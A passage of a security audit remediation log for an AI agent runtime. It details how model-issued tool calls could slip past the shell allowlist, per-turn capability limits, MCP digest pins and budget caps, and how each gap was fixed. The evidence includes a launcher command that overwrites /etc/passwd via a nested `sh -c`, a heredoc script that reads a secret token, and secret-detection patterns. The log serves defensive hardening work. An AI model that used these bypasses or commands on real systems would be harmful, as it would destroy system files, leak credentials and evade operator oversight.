  `tests/policy/test_shell.py::TestExtractAllPrograms`.
- **Residual risk:** the launcher sub-finding is unaddressed — `find`,
  `xargs`, `bash`, `sh`, `python`, `sudo`, etc. remain allowlist-able
  with only a log warning, and a launcher's arguments can embed a
  nested shell command whose own redirects are invisible to this
  (or any) static command-string parser — confirmed by inspection:
  `find . -exec sh -c 'echo x > /etc/passwd' \;` tokenises the quoted
  `sh -c` argument as a single opaque string, so
  `extract_redirect_targets()` correctly does not (and structurally
  cannot) see the redirect inside it. Closing this requires either
  blocking launcher commands outright (a real behavioral/product change
  affecting legitimate scripting use cases, not a mechanical bug fix)
  or runtime-level interception (e.g. a sandboxed/traced subprocess),
  neither of which was attempted this checkpoint. Also not addressed:
  Incus tools' `resolve_shell_command()` (SR-1.5) always resolves to the
  literal string `"incus"`, so this new redirect check has no visibility
  into Incus's own argv-list-based `subprocess.run(["incus", ...])`
  invocation — correctly so, since Incus never uses `shell=True` and
  therefore has no shell-redirection attack surface of this kind at all.

### SR-1.10 — Audit sink wrote secrets to disk unredacted

- **Status: fixed** for the core architectural defect (redaction
  happening at display time only, never before persistence) plus the
  two specific token-shape gaps the review named by name in the same
  sentence it raised this finding.
- **Reachability found:** live and confirmed — every audit event's
  `detail` dict was serialized to `~/.missy/audit.jsonl` completely
  verbatim, with no redaction of any kind, regardless of which
  subsystem published it (policy engines, the HTTP gateway, providers,
  tools). `api/audit_browser.py` only redacts when *rendering* events
  for the Web TUI — a purely cosmetic filter that cannot undo what has
  already been written to the persistent JSONL file, which is the
  review's core point ("a storage leak the viewer can't repair").
  Live-reproduced: publishing an audit event with a realistic
  Anthropic-shaped bearer token in a header, an AWS presigned-URL
  signature in an error string, and a Google-API-key-shaped value in a
  URL query string resulted in **all three appearing in plaintext** in
  the on-disk JSONL file, exactly as constructed, with zero redaction.
- **Remediation evidence:** added `_redact_detail()`
  (`missy/observability/audit_logger.py`), a small recursive walker
  that applies the existing `missy.security.censor.censor_response()`
  (backed by `SecretsDetector`) to every string leaf of a `detail`
  dict/list/tuple structure, preserving shape; wired into
  `AuditLogger._handle_event()` — the single choke point every
  published `AuditEvent` passes through before being written to disk —
  so this covers every publisher uniformly rather than requiring each
  one to remember to redact its own `detail` (one existing call site,
  `ToolRegistry._emit_event`, already redacted its own message
  independently; that becomes redundant-but-harmless double redaction,
  not a conflict). Also added the two token-shape patterns the review
  named as gaps in the same breath as this finding
  (`SecretsDetector.SECRET_PATTERNS`): `bearer_token`
  (`Bearer <token>`, matched wherever it appears — header line or
  JSON-serialized value, not just after a literal `Authorization:`
  prefix), `basic_auth_header` (`Authorization: Basic <base64>`), and
  `aws_presigned_signature` (`X-Amz-Signature=<hex>`, the specific AWS
  SigV4 presigned-URL leak vector named in the finding). Live-verified
  the exact three-secret reproduction above now redacts all three to
  `[REDACTED]` on disk; confirmed the correctly-shaped Google API key
  is caught by its existing content-shape pattern (`gcp_key`)
  regardless of surrounding context, since that pattern (like most of
  the ~50 others) matches the secret's own shape rather than requiring
  a specific delimiter/prefix. 6 new tests in
  `tests/observability/test_audit_logger.py::TestHandleEventRedactsSecrets`;
  2 pre-existing tests that hardcoded the total pattern count updated
  from 50 to 53.
- **Residual risk:** the review explicitly hedged that "individual
  token-shape gaps" should be "verified... before asserting each" —
  this checkpoint closed the two gaps named explicitly, not a general
  audit of every possible secret shape. A generic "URL query parameter
  literally named `key`/`token`/`secret` is always a credential"
  pattern was deliberately NOT added — it would have unacceptable
  false-positive risk against ordinary non-secret query parameters
  (e.g. a genuine sort/cache key), so a bare `?key=<opaque-string>`
  with no recognizable provider-specific shape can still be logged
  unredacted; only recognized credential *shapes* (GCP/AWS/Anthropic/
  OpenAI/GitHub/etc. key formats, JWTs, bearer/basic auth headers, AWS
  presigned signatures) are caught. Redaction happens only at the audit
  sink — any other place `detail`-shaped data might be persisted (e.g.
  a future export/backup feature) would need to apply the same
  `_redact_detail()` helper independently; it is not itself
  automatically inherited by new persistence paths.

### SR-1.11 — MCP manifest digest pinning self-destructs on reconnect

- **Status: fixed.**
- **Reachability found:** live and directly exploitable through normal
  operational use, no attacker interaction needed. `McpManager.add_server()`
  (`missy/mcp/manager.py`) calls `self._save_config()` unconditionally
  after every successful connect — including reconnects — and
  `_save_config()` rebuilt every config entry purely from
  `self._clients` (`name`/`command`/`url`), silently dropping any
  `digest` field. `missy mcp pin <name>` correctly writes the digest via
  `pin_server_digest()` (which reads-modifies-writes the existing file
  directly), but the very next time `McpManager` starts up and
  reconnects — a completely ordinary event, not an attack — `add_server()`'s
  post-connect `_save_config()` call erases it. Live-reproduced
  end-to-end: pinned a server's digest, then simulated a process restart
  (`connect_all()` on a fresh `McpManager` reading the same config file)
  — the `digest` key was **completely gone** from the config file
  afterward. A second reproduction confirmed the consequence: after that
  reconnect erased the pin, `add_server()`'s `expected_digest is None`
  branch means digest verification is silently skipped entirely on every
  subsequent connection — a compromised/tampered MCP server's tool
  manifest would connect successfully with **no error, warning, or audit
  signal** that the protection `missy mcp pin` was supposed to provide
  had quietly stopped applying.
- **Remediation evidence:** `_save_config()` now reads the existing
  on-disk config first (if present) to recover each server's currently
  pinned `digest`, and merges it back into the freshly rebuilt entries
  before writing — preserving whatever digest is already pinned for a
  given server name across every rewrite, regardless of what triggered
  it (add/remove/reconnect of any server). Live-verified: the exact
  reproduction above now retains the digest after one reconnect cycle,
  *and* after three repeated reconnect cycles (proving the digest isn't
  merely re-derived once and then lost again), *and* — critically — the
  pin remains functionally effective afterward: a tampered tool manifest
  presented on a connection attempt following a clean reconnect cycle is
  still correctly denied with `"MCP server 'srv' tool manifest digest
  mismatch"`. Also verified digests for multiple independently-pinned
  servers all survive a `_save_config()` triggered by adding an
  unrelated new server, and that both a missing and a corrupt on-disk
  config degrade gracefully (no digests to recover, but the write itself
  still succeeds — matches `_get_server_digest()`'s existing
  fail-open-on-corrupt-file-format for *reading*, not a new fail-open
  for the actual digest *check*, which is unaffected). 7 new tests in
  `tests/mcp/test_manager_edges.py::TestSaveConfigPreservesDigest`.
- **Residual risk:** the digest itself still only covers `name` +
  `description` of each tool (per `mcp/digest.py`, unchanged by this
  fix) — not `inputSchema` or annotations, a separate, narrower gap the
  review notes in the same finding and that this checkpoint does not
  address. The `_save_config()` write path is otherwise unchanged
  (atomic tempfile + rename, `0o600` permissions, uid/group-writable
  checks on load) — this fix only changes which fields are included in
  the rewritten entries, not the write mechanism itself.

### SR-2.4 — Heredoc rewrite wrote model code to disk before policy approval

- **Status: fixed.** First finding addressed from the review's §2
  (unattended-execution hazards) rather than §1.
- **Reachability found:** live and directly exploitable, no policy
  misconfiguration needed — this affects every `shell_exec` call whose
  command contains a heredoc, unconditionally. `_rewrite_heredoc_command()`
  (`missy/agent/runtime.py`) extracted a heredoc body from a model-supplied
  `shell_exec` command and wrote it to a real temp file
  (`tempfile.mkstemp(prefix="missy_heredoc_")`) at the call site — *before*
  the shell policy check, which only happens later inside
  `registry.execute()` → `ToolRegistry._check_permissions()` →
  `ShellPolicyEngine.check_command()`. Live-reproduced: with the shell
  policy engine never even consulted (no `interpreter` allowlist check of
  any kind existed in this function), calling it with
  `command="python3 - <<'PY'\nimport os\nprint(os.environ.get('SUPER_SECRET_TOKEN'))\nPY"`
  wrote the full script — including the secret-reading logic — to
  `/tmp/missy_heredoc_*.py` unconditionally, regardless of whether
  `"python3"` was ever going to be permitted to execute at all. The file
  was also never deleted after use, regardless of outcome — a second,
  related defect the review names in the same finding ("a persistent
  temp file that may hold secrets").
- **Remediation evidence:** `_rewrite_heredoc_command()` now checks the
  interpreter against the real shell policy (`PolicyEngine.check_shell()`,
  reusing SR-1.7's uniform redirect-aware check — though the rewritten
  command is always exactly `"{interpreter} {tmppath}"` with no
  redirection, so this reduces to a plain program-name check) *before*
  writing anything to disk. If the interpreter isn't permitted, or the
  policy engine isn't initialised (treated the same as a policy engine
  being initialised-but-denying, matching the registry's own existing
  fail-closed posture), the function returns the *original* heredoc-laden
  command unmodified — it then reaches `registry.execute()` and is denied
  there normally (via the existing `<<` subshell-marker rejection), with
  zero disk footprint. When the interpreter *is* permitted, the function
  now also returns the temp file's path; the call site
  (`AgentRuntime`'s tool-dispatch loop) wraps the whole retry loop in a
  `try/finally` that unconditionally deletes the temp file once the tool
  call finishes, regardless of success, failure, or retries exhausted —
  closing the "never deleted" defect too. Live-verified the exact
  `SUPER_SECRET_TOKEN`-reading reproduction above: with `"python3"` not in
  `allowed_commands`, **zero new files appear on disk** at any point
  (confirmed via a before/after glob of `/tmp/missy_heredoc_*`), whereas
  the identical call previously always wrote the file regardless of
  policy. 4 new tests in
  `tests/agent/test_runtime_config_edges.py::TestRewriteHeredocCommandPolicyGate`;
  all ~20 pre-existing heredoc-rewrite tests updated for the new
  `(tool_args, tmppath)` return signature and given a real, permissive
  policy engine fixture so they continue to exercise genuine rewrite
  behavior rather than silently degrading to passthrough.
- **Residual risk:** this closes the specific mechanism named by the
  review (heredoc rewriting in `shell_exec`); it does not add a general
  "no tool may write to disk before its own policy check passes"
  invariant enforced at the framework level — any *other* tool that
  writes an intermediate file before calling `registry.execute()` would
  need the same pattern applied independently. No other such call site
  was found in this codebase during this checkpoint, but a full audit
  for the same "write-then-check" ordering across all built-in tools was
  not performed.

### SR-2.3 — Execution-time tool allow-set was not revalidated at dispatch

- **Status: fixed.**
- **Reachability found:** live and directly confirmed against the real
  `AgentRuntime`. `_tool_loop()` computes the per-turn visible tool set
  exactly once via `_get_tools()` — which resolves `capability_mode`
  (`"full"`/`"safe-chat"`/`"discord"`/`"no-tools"`) and
  `tool_policy`/`agent_tool_policy`/`group_tool_policy` layers — and
  presents that resolved list to the provider as the available function
  definitions for the turn. But `_execute_tool()`, the dispatch function
  actually invoked for every tool call the model returns, looked up
  `tool_call.name` directly in the live `ToolRegistry` and called
  `registry.execute()` with **no check whatsoever** against the
  resolved per-turn set — meaning the capability-mode/tool-policy layer
  only ever constrained what the model was *shown*, never what could
  actually be *dispatched*. Live-reproduced end-to-end against real
  `AgentRuntime`/`_get_tools()`/`_execute_tool()` code (only the
  underlying `ToolRegistry` itself was mocked): with
  `capability_mode="safe-chat"`, `_get_tools()` correctly excluded
  `shell_exec` from the visible set (only `calculator` survived), yet
  calling `_execute_tool()` directly with a `shell_exec` tool call
  still dispatched to `registry.execute("shell_exec", ...)` and
  returned success — a hallucinated, stale-from-an-earlier-turn, or
  provider-ignored-the-function-list tool name would silently bypass
  `capability_mode`/`tool_policy` entirely (though the registry's own
  independent filesystem/network/shell checks, if any apply to that
  tool, still ran — this is specifically about the higher-level
  capability layer being skippable, not a total security bypass).
- **Remediation evidence:** `_tool_loop()` now computes
  `allowed_tool_names = {t.name for t in tools}` once (from the exact
  `tools` list it already resolved and handed to the provider) and
  passes it into every `_execute_tool()` call for that turn.
  `_execute_tool()` gained an `allowed_tool_names: set[str] | None`
  parameter — when provided, any `tool_call.name` not in the set is
  refused immediately with a `ToolResult(is_error=True, ...)` and a
  `tool_execute`/`deny` audit event, **before the registry is consulted
  at all** (`registry.execute()` is never called for a denied name,
  confirmed via mock-call assertions). `None` (the default) skips the
  check entirely, preserving exact prior behavior for any call site
  without a resolved per-turn set. Live-verified the exact reproduction
  above: the identical `shell_exec` dispatch now returns
  `is_error=True` with `"not available this turn"`, and
  `registry.execute` is confirmed never invoked. 6 new tests in
  `tests/agent/test_coverage_gaps.py::TestRuntimeExecuteToolAllowSet`,
  including one exercising the full `_tool_loop()` → `_execute_tool()`
  wiring end-to-end (not just the guard clause in isolation). 3
  pre-existing tests in `tests/agent/test_mutation_fingerprint.py` that
  stub `_execute_tool()` wholesale were updated to accept the new
  keyword argument.
- **Residual risk:** this closes the specific gap the review names —
  dispatch not being checked against the per-turn resolved set — but
  does not add allow-set revalidation for policy *hot-reloads* mid-loop
  (a config change applied between one iteration and the next within
  the same multi-step tool loop would not be picked up until the next
  `_get_tools()` call, i.e. the next full turn) — the review's finding
  text explicitly frames this as "a hole under policy hot-reload
  mid-loop," which is a narrower, separate scenario this fix does not
  specifically target (though it does close the more general "any
  registry-known name works regardless of the per-turn set" gap, which
  is the finding's primary, more broadly reachable claim).

### SR-3.4 — Budget cap checked only after the paid provider call

- **Status: fixed** for the checked-after-not-before ordering defect —
  "a billing-control bug worse than a clean lockout," in the review's
  own words. The separate cross-session-aggregation sub-finding (a
  shared Discord/API runtime's `CostTracker` never resets between
  logically distinct sessions) is unaddressed — see residual risk.
- **Reachability found:** live and directly confirmed. `_tool_loop()`
  called `provider.complete_with_tools()` (a paid call) and only
  afterward called `_record_cost()` then `_check_budget()` — so once
  accumulated spend had already crossed `max_spend_usd` from prior
  calls, the *next* call still happened, incurred real provider cost,
  and was denied only after the fact. Separately, `_single_turn()` —
  used both directly for non-tool-loop single-turn requests and as
  `_tool_loop`'s fallback when a provider doesn't implement
  `complete_with_tools` — never called `_check_budget()` at all, in
  either direction; a budget cap configured via `max_spend_usd`
  provided **zero enforcement** on that entire code path. Live-verified
  both defects end-to-end against real `AgentRuntime`/`CostTracker`
  code: with `max_spend_usd=0.01` and the tracker's accumulated cost
  pre-set to `$5.00` (simulating budget already exhausted by prior
  calls), calling `_tool_loop()` still invoked
  `provider.complete_with_tools()` — confirmed via mock call assertion
  — before `BudgetExceededError` was raised afterward.
- **Remediation evidence:** added a `self._check_budget(...)` call at
  the very top of each `_tool_loop()` iteration, before the rate-limit
  acquire and before the provider call — using the cost already
  accumulated from *prior* calls (fully known at that point), which
  cannot preemptively deny the one call that actually crosses the
  threshold (its own cost isn't known until it completes and is
  recorded, an inherent limit of usage-based billing) but does stop
  every call *after* that one from incurring further billed usage
  before being denied. Also added `_check_budget()` calls to
  `_single_turn()` (both before and after its `provider.complete()`
  call), closing the second, independent "no enforcement at all" gap
  on that path — one change here covers every caller (the direct
  single-turn path and the tool-loop fallback both benefit
  automatically). Live-verified: with the same $5.00-already-spent /
  $0.01-cap setup, `provider.complete_with_tools()` is now confirmed
  **never called**, and the identical scenario for `_single_turn()`
  confirms `provider.complete()` is also never called. Confirmed the
  fix doesn't affect normal (under-budget) operation, and that
  `max_spend_usd=0.0` (unlimited, the default) never blocks regardless
  of accumulated cost. 5 new tests in
  `tests/agent/test_runtime_enhancements.py::TestBudgetCheckedBeforePaidCall`.
- **Residual risk:** the cross-session-aggregation sub-finding is not
  addressed — `CostTracker` is constructed once per `AgentRuntime` and
  never resets, so a shared runtime serving multiple logically distinct
  sessions (e.g. a Discord bot or the Web API serving many users through
  one process) aggregates spend across all of them against a single cap
  intended to be per-session, which could cause one user's activity to
  exhaust budget for everyone else sharing that runtime. That is a
  separate architectural question (does `max_spend_usd` need to become
  per-session-keyed rather than per-runtime?) not addressed by this
  ordering fix.

### SR-3.2 — Summarizer silently never summarizes; three named sub-bugs, one still live

- **Status: fixed** for the sub-bug that was actually still reachable;
  the other two sub-bugs the review named are **no longer applicable** —
  independently re-verified against current code rather than assumed
  fixed, per the prompt's "verify before fixing" requirement.
- **Reachability found (live-verified):** `Summarizer._call_llm()`
  (`missy/agent/summarizer.py:176`) called `self._provider.chat(...)`.
  No provider in this codebase implements `.chat()` —
  `missy.providers.base.BaseProvider` only defines `complete()` /
  `complete_with_tools()` (confirmed via
  `grep -rln "def chat(" missy/providers/` → empty). Live reproduction
  with a `MagicMock(spec=["complete", "complete_with_tools",
  "is_available", "name"])` provider (matching the real interface)
  confirmed both Tier 1 ("normal") and Tier 2 ("aggressive") of
  `_escalate()` raised `AttributeError` on every call and were silently
  swallowed by the surrounding `except Exception` blocks, falling
  through to Tier 3 on every single invocation:
  `tier_counts: {'normal': 0, 'aggressive': 0, 'fallback': 1}`,
  `provider.complete.called == False`. This is worse than "summarization
  is degraded" — Tier 3's fallback truncates the *prompt template
  string itself* (`prompt[:target_tokens*4]`), so the persisted
  "summary" actually stored via `compact_session()` →
  `memory_store.add_summary()` was largely boilerplate instruction text
  ("Summarize the following conversation excerpt. Preserve: - Key
  decisions...") rather than any real content from the conversation,
  with a hard cliff at the token budget. Since `AgentRuntime` wires a
  real provider into every `Summarizer` (`runtime.py:1945`), this fired
  on every real compaction pass in production, not just tests.
  - Root cause of why this went undetected: the existing test suite
    (`tests/agent/test_summarizer.py`,
    `tests/agent/test_compaction.py`,
    `tests/agent/test_compaction_extended.py`) all constructed provider
    mocks as bare `MagicMock()` with no `spec`. A bare `MagicMock()`
    auto-vivifies any attribute access, so `provider.chat(...)` silently
    returned another `MagicMock` instead of raising `AttributeError` —
    the tests exercised and asserted against a method that doesn't
    exist on any real provider, and would have kept passing forever
    regardless of which provider method the implementation called.
  - The other two sub-bugs the review's text names were independently
    re-derived as **already resolved / not currently reproducible**,
    verified by reading the actual current code and tracing actual
    runtime call paths rather than trusting the review's text at face
    value:
    - `_format_turns()`'s `t.timestamp[:19]` string-slicing: confirmed
      `ConversationTurn.timestamp` (`missy/memory/sqlite_store.py`) is
      genuinely `str`-typed and populated via
      `datetime.now(UTC).isoformat()` in `.new()`; the SQLite connection
      has no `detect_types`/converter registration, so this column
      returns as a plain `str` on every read path. String-slicing a
      `str` is valid; no crash reproduces.
    - `compact_session()` calling `memory_store` methods that don't
      exist: confirmed `SQLiteMemoryStore` (the production store per
      FX-B's `_make_memory_store()` fix) implements every method
      `compact_session()`/`compact_if_needed()` calls —
      `get_session_turns`, `get_summaries`, `add_summary`,
      `get_uncompacted_summaries`, `mark_summary_compacted`,
      `get_session_token_count` — all present and correctly wired.
      Likely resolved as a side effect of this session's earlier FX-B
      fix (which moved production off the old JSON `MemoryStore` onto a
      bare `SQLiteMemoryStore()`), or the review's pinned commit
      (`abb7015`) predates other unrelated fixes to this file.
- **Remediation evidence:** `_call_llm()` now calls
  `self._provider.complete(messages, temperature=temperature,
  max_tokens=4096)`, matching `BaseProvider.complete(self, messages:
  list[Message], **kwargs) -> CompletionResponse`'s real signature.
  Also corrected the `Summarizer.__init__` docstring, which claimed a
  provider needed "a `chat()` or `complete()` method" (no such
  alternative ever existed). Live re-verification with the identical
  `MagicMock(spec=[...])` reproduction setup now shows
  `provider.complete.called == True`,
  `tier_counts: {'normal': 1, 'aggressive': 0, 'fallback': 0}`, and a
  real LLM-generated summary text returned instead of boilerplate
  truncation. Fixed the same bug-masking pattern at its source in all
  three affected test files
  (`tests/agent/test_summarizer.py`,
  `tests/agent/test_compaction.py`,
  `tests/agent/test_compaction_extended.py`) by switching every
  provider mock to `MagicMock(spec=BaseProvider)`, which rejects calls
  to nonexistent methods exactly like a real provider would, plus a
  dedicated `FakeProvider.complete()` rename in
  `tests/agent/test_summarizer_proactive_edges.py` (a hand-written fake,
  not a `MagicMock`, so it would otherwise now raise `AttributeError`
  itself post-fix). Added 2 new regression tests to
  `tests/agent/test_summarizer.py`:
  `TestSummarizeTurns::test_calls_provider_complete_not_chat` (asserts
  `provider.complete.called` and `tier_counts["fallback"] == 0` for a
  normal summarization call) and
  `TestSummarizeTurns::test_real_provider_interface_rejects_chat_call`
  (a standalone sanity check that `spec=BaseProvider` genuinely enforces
  the interface, i.e. that this regression test would itself fail loudly
  if the interface-conformance guard were ever removed). 129 tests in
  the 4 affected files pass; `tests/agent/` (4,143 tests) passes in
  full with no regressions.
- **Residual risk:** none identified for this specific finding. General
  note for future work: any new provider-facing code path added to
  `missy/agent/` should default new test doubles to
  `MagicMock(spec=BaseProvider)` (or an equivalent interface-constrained
  fake) rather than a bare `MagicMock()`, to avoid reintroducing this
  class of "test mocks a nonexistent method and never notices" bug
  elsewhere.

### SR-3.3 — memory_search/memory_describe/memory_expand were completely non-functional in production

- **Status: fixed.** This started as a "verify before fixing" checkpoint
  (the review's SR-3.3 text was suspected possibly already resolved as a
  side effect of FX-B, per the same discipline that closed out most of
  SR-3.2). It was not — verification uncovered a worse, live, confirmed
  reality than the review's own text anticipated: the retrieval tools
  had never worked at all, in any configuration, for any call.
- **Reachability found (live-verified, two independent stacked bugs):**
  1. None of `MemorySearchTool`, `MemoryDescribeTool`, `MemoryExpandTool`
     (`missy/tools/builtin/memory_tools.py`) declared the
     `permissions: ToolPermissions` class attribute that
     `BaseTool`/`ToolRegistry._check_permissions()` requires — they
     carried vestigial, nonstandard attributes (`requires_filesystem_read
     = []`, `requires_network = []`, etc.) that correspond to nothing the
     registry reads. Every dispatch of any of these three tools through
     the real `ToolRegistry.execute()` crashed with `AttributeError:
     'MemoryExpandTool' object has no attribute 'permissions'` inside
     `_check_permissions()`, before the tool's own logic ever ran.
  2. Even with (1) hypothetically fixed, `AgentRuntime._execute_tool()`
     never injected the `_memory_store`/`_session_id` private kwargs
     these tools read via `kwargs.get("_memory_store")` — nothing in the
     dispatch path (`_execute_tool()` → `ToolRegistry.execute()` →
     `tool.execute(**tool_kwargs)`) ever set them, so even a
     permissions-fixed tool would still unconditionally return "Memory
     store is not available."
  - Root cause of non-detection: every existing test for these three
    tools called `tool.execute(_memory_store=store, ...)` directly,
    which exercises neither bug — it bypasses both the registry's
    permission check and the runtime's (nonexistent) kwarg injection
    entirely. No test in the suite had ever dispatched these tools
    through the real `ToolRegistry` or the real `AgentRuntime._execute_tool()`.
  - Severity: `AgentRuntime._intercept_large_content()`
    (`missy/agent/runtime.py`) explicitly tells the model "Use
    memory_search or memory_expand to retrieve full content" after every
    large-tool-output truncation — a promise the runtime could never
    keep. Live-reproduced end-to-end via the real production
    `AgentRuntime._execute_tool()` method (not a hand-simulation):
    stored a large-content record, then called `memory_expand` through
    `_execute_tool()` — result: `is_error=True`,
    `content="Tool execution failed due to an internal error."`
    (the generic catch-all in `_execute_tool()` swallowed the
    `AttributeError`, so the agent loop itself never crashed, but the
    tool call always failed). Confirmed via `git stash` that this
    reproduces on the pre-fix tree.
  - Separately audited (not found broken, but worth recording): once
    wired up, does `memory_search` leak across sessions when the model
    omits `session_id`? `MemorySearchTool.execute()`'s own code already
    correctly falls back to a private `_session_id` kwarg
    (`kwargs.get("session_id", "") or kwargs.get("_session_id", "")`,
    matching its schema's documented "Empty = current session"
    contract) — it was simply never being given a real `_session_id` to
    fall back to, for the same reason as bug (2) above. No separate leak
    once wiring is fixed; live-verified below.
- **Remediation evidence:** Added `permissions = ToolPermissions()` to
  all three tools (they need no elevated network/filesystem/shell access
  — they only read from an in-process store reference), replacing the
  vestigial attributes entirely rather than leaving dead, misleading
  declarations in place. Added a new `_MEMORY_RETRIEVAL_TOOL_NAMES`
  constant and injection block in `AgentRuntime._execute_tool()`
  (mirroring the existing SR-2.4 heredoc special-case pattern already
  used for `shell_exec`): for `memory_search`/`memory_describe`/
  `memory_expand` specifically, `tool_args` is extended with
  `_memory_store=self._memory_store` and `_session_id=session_id`
  before dispatch; every other tool's args are unmodified. Live
  re-verified through the real `AgentRuntime._execute_tool()` method:
  `memory_expand` now retrieves the exact stored content
  (`is_error=False`), `memory_describe` returns real metadata, and
  `memory_search` both finds stored turns and — critically — **defaults
  to the calling session only** when the model omits `session_id`
  (verified with two sessions sharing a search keyword: only the
  calling session's turn is returned), while still honoring an
  explicit, model-supplied `session_id` override for intentional
  cross-session lookups (documented, opt-in behavior for a
  single-user local assistant retrieving related earlier context — not
  a default-scope leak). 10 new tests:
  `tests/tools/test_memory_tools.py::TestMemoryToolsDispatchThroughRealRegistry`
  (4 tests, dispatch through a real `ToolRegistry`, catches bug 1) and
  a new `tests/agent/test_memory_tool_dispatch_wiring.py` (6 tests,
  dispatch through the real `AgentRuntime._execute_tool()`, catches bug
  2 and the session-scoping behavior). `tests/agent/` + `tests/tools/`
  (5,656 tests) pass with no regressions; full suite 20,870 passed (up
  from 20,860), only the 3 known pre-existing vision flakes failing.
- **Residual risk:** none identified for the core finding. The
  "preserve enough evidence for the model and operator to verify
  results" and "handle storage failure explicitly instead of
  advertising nonexistent retrieval" parts of SR-3.3's text were
  already correctly implemented in
  `AgentRuntime._intercept_large_content()`'s exception path (verified
  by reading, not assumed) and required no change. General note for
  future work: any new agent-callable tool that needs a live runtime
  reference (store, registry, session context) via a private `_`-kwarg
  must have that injection point covered by a test that dispatches
  through the real `ToolRegistry`/`AgentRuntime`, not just a direct
  `tool.execute(...)` call — this exact gap is what hid both stacked
  bugs here for however long they existed.

### SR-3.5 — Non-atomic JSON store writes: unreachable from production, but 3 real "wrong backend" bugs found along the way

- **Status: fixed / confirmed no longer applicable**, with a caveat: the
  literal question the review's text asks ("remove non-atomic full-file
  memory rewrites from production paths") turned out to already be true
  — but verifying that turned up three unrelated, live, confirmed bugs
  in code paths still referencing the legacy JSON store, all now fixed.
- **Investigation:** `missy.memory.store.MemoryStore._save()` does an
  unconditional `Path.write_text()` over the whole file — no temp-file +
  atomic rename, no fsync, no inter-process locking — exactly the
  pattern the review flags. The question was whether any production
  code path still reaches it. Grepped every `MemoryStore(` construction
  site in `missy/` (excluding the class definition and other classes'
  names): exactly 3 call sites —
  `missy/skills/builtin/summarize_session.py`,
  `missy/scheduler/manager.py::cleanup_memory()`, and
  `missy/cli/main.py::sessions_cleanup()`. Traced each one's actual
  usage of the constructed store: none of them ever call a write method
  (`add_turn`/`clear_session`/`compact_session`/`save_learning`) — two
  only call `get_session_turns()` (read-only) or a `cleanup()` guarded
  by `hasattr(store, "cleanup")`, and `MemoryStore` has **no** `cleanup`
  method at all, so that guard is always `False`. Confirmed via
  `MemoryStore.__init__` that merely constructing the class only calls
  `_load()` (read), never `_save()`. Conclusion: `_save()`'s non-atomic
  write path was **not reachable from any production code path** even
  before this checkpoint — the literal SR-3.5 ask checks out.
- **What the investigation actually found (three live bugs, same root
  cause as FX-B: a code path never updated to point at the production
  SQLite backend):**
  1. `summarize_session.py`'s `SummarizeSessionSkill` read from
     `MemoryStore()` (the legacy JSON store) instead of
     `SQLiteMemoryStore()` (the production backend since FX-B). Since
     FX-B, real conversation turns are written to SQLite, not the JSON
     file — so this skill always returned "(no turns recorded for this
     session)" regardless of how much real history existed. Live-verified:
     constructed a real `SQLiteMemoryStore` with 2 real turns, invoked the
     skill (patched to hit the stale JSON path), got "(no turns recorded
     for this session)" back.
  2. `scheduler/manager.py::cleanup_memory()` and
     `cli/main.py::sessions_cleanup()` (a documented CLI command,
     `missy sessions cleanup`, listed in this project's CLI reference)
     both constructed `MemoryStore()` and guarded the call with
     `hasattr(store, "cleanup")`. Since that method doesn't exist on
     `MemoryStore`, both always silently no-op'd — the scheduled cleanup
     job always "succeeded" having deleted nothing, and the CLI command
     always printed "Memory store does not support cleanup (use
     SQLiteMemoryStore)" even though `SQLiteMemoryStore` — which does
     support `cleanup()` — was already imported and used two commands
     later in the very same file (`sessions_list`). Live-verified via
     `hasattr(MemoryStore(...), "cleanup") == False` vs.
     `hasattr(SQLiteMemoryStore(...), "cleanup") == True`.
  - Root cause of non-detection (same class of bug-masking as SR-3.2's
    `MagicMock()`-without-`spec` issue, different mechanism): every
    existing test for these three call sites patched
    `missy.memory.store.MemoryStore` with a bare `MagicMock()` — which,
    critically, auto-vivifies a `.cleanup` attribute that the real
    `MemoryStore` class doesn't have, so `hasattr(mock_store, "cleanup")`
    was always `True` in tests while always `False` against the real
    class in production. One test
    (`TestSessionsCleanupNoMethod::test_sessions_cleanup_store_without_cleanup_method`
    and its two scheduler-test siblings) even explicitly constructed a
    `MagicMock(spec=[])` to simulate the "no cleanup method" case and
    asserted the CLI's "does not support cleanup" message appeared —
    correctly modeling the bug's symptom as expected, permanent
    behavior, rather than a defect to fix.
- **Remediation evidence:** switched all three call sites to
  `SQLiteMemoryStore()`. Fixed `summarize_session.py`'s `_format_turns()`
  helper, which assumed `turn.timestamp` was a `datetime` object
  (matching the legacy store's `ConversationTurn`) and called
  `.isoformat()` on it — `SQLiteMemoryStore.ConversationTurn.timestamp`
  is an ISO-8601 `str`, so this would have crashed with
  `AttributeError: 'str' object has no attribute 'isoformat'` immediately
  after the backend switch; changed to `timestamp[:19]` string slicing,
  matching the pattern already used elsewhere in the codebase (e.g.
  `Summarizer._format_turns()`). Removed the now-dead `hasattr(store,
  "cleanup")` guards entirely from both `cleanup_memory()` and
  `sessions_cleanup()` since `SQLiteMemoryStore.cleanup()` always exists.
  Deleted the 3 tests that explicitly encoded the "no cleanup method"
  symptom as correct behavior (the code branch they tested no longer
  exists) and updated every other affected test's patch target from
  `missy.memory.store.MemoryStore` to
  `missy.memory.sqlite_store.SQLiteMemoryStore`. Added 3 new regression
  tests using a **real** `SQLiteMemoryStore` against a real temp-file
  DB (not mocks) for each of the three fixed call sites, confirming
  actual data is retrieved/deleted, not just that a mock method was
  called: `tests/skills/test_builtin_skills.py::test_reads_real_turns_from_sqlite_backend`,
  `tests/scheduler/test_manager_coverage.py::test_cleanup_memory_actually_deletes_from_real_store`,
  `tests/cli/test_cli_commands.py::test_sessions_cleanup_actually_deletes_from_real_store`.
  Also corrected `missy/memory/__init__.py`'s public-API docstring,
  which called the legacy `MemoryStore` "the default" — it has not been
  the default since FX-B and is not constructed by any production code
  path as of this checkpoint. `tests/agent/` + `tests/tools/` +
  `tests/cli/` + `tests/scheduler/` + `tests/skills/` + `tests/unit/` +
  `tests/memory/` (10,050 tests) pass with no regressions; full suite
  20,870 passed (net zero change from SR-3.3's checkpoint — 3 obsolete
  tests removed, 3 new live regression tests added), only the 3 known
  pre-existing vision flakes failing.
- **Residual risk:** `MemoryStore`/`missy/memory/store.py` itself is
  unchanged and still exists as a public, documented, zero-dependency
  option (per its own docstring) for embedders who don't want a SQLite
  dependency — its non-atomic `_save()` is still exactly as non-atomic
  as before. That's fine as long as nothing in Missy's own production
  code path constructs it, which is now confirmed and enforced by the
  new live-store regression tests (they'll fail loudly if a future
  change reintroduces a `MemoryStore()` construction at any of these
  three call sites). If a future feature deliberately wants the JSON
  store's zero-dependency property for some new production path, this
  checkpoint's finding means that path would need its own atomicity
  fix (temp-file + atomic rename + fsync + locking) before shipping,
